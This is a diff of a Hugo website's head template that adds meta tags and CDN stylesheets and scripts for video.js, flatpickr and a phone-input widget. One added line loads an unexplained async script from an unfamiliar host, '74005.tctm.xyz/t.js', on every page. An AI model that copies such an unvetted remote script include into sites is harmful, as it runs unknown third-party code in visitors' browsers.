@@ -1,5 +1,33 @@
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width">
-<title>{{ if .IsHome }}{{ site.Title }}{{ else }}{{ printf "%s | %s" .Title site.Title }}{{ end }}</title>
-{{ partialCached "head/css.html" . }}
-{{ partialCached "head/js.html" . }}
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="canonical" href="{{ .Permalink }}" />
+<link rel="alternate" type="application/rss+xml" href="{{ "/feed.xml" | absURL }}" title="{{ .Site.Title }}" />
+
+<title>
+  {{ if .IsHome }} {{ .Site.Title | markdownify }} · {{ .Site.Params.description | markdownify }} {{ else }} {{ .Title |
+  markdownify }} | {{ .Site.Title | markdownify }} {{ end }}
+</title>
+<meta
+  name="description"
+  content="{{ with .Description }}
+        {{ . | markdownify }}
+    {{ else }}
+        {{ if .IsPage }}
+            {{ .Summary }}
+        {{ else }}
+            {{ with .Site.Params.description }}{{ . | markdownify }}{{ end }}
+        {{ end }}
+    {{ end }}"
+/>
+<meta name="generator" content="Hugo {{ hugo.Version }}" />
+{{ with .Params.robots -}}
+<meta name="robots" content="{{ . }}" />
+{{- end }} {{ partial "stylesheet" . }}
+<link href="https://vjs.zencdn.net/8.6.1/video-js.css" rel="stylesheet" />
+<!-- Flatpickr CSS -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css" />
+<script async src="//74005.tctm.xyz/t.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css" />
+<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
